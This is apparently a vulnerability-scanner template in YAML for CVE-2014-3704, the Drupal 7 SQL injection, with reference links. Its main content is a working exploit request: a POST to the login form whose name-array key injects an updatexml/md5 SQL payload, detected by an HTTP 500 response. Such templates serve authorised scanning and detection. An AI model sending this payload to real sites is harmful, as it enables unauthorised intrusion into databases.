id: yaml-poc-drupal-drupal-sql_injection-CVE-2014-3704
info:
  name: Yaml Poc Drupal Drupal Sql_Injection Cve 2014 3704
  author: converted
  severity: high
  description: 'Converted from xpoc: yaml-poc-drupal-drupal-sql_injection-CVE-2014-3704'
  tags: drupal,sqli,cve
  classification:
    cve-id: CVE-2014-3704
  reference:
  - http://osvdb.org/show/osvdb/113371
  - http://packetstormsecurity.com/files/128720/Drupal-7.X-SQL-Injection.html
  - http://packetstormsecurity.com/files/128721/Drupal-7.31-SQL-Injection.html
  - http://packetstormsecurity.com/files/128741/Drupal-HTTP-Parameter-Key-Value-SQL-Injection.html
  - http://seclists.org/fulldisclosure/2014/Oct/75
http:
- method: POST
  path:
  - /?q=node&destination=node
  body: pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,(select
    md5({{rand}}))),0)%23]=bob&name[0]=a
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 500
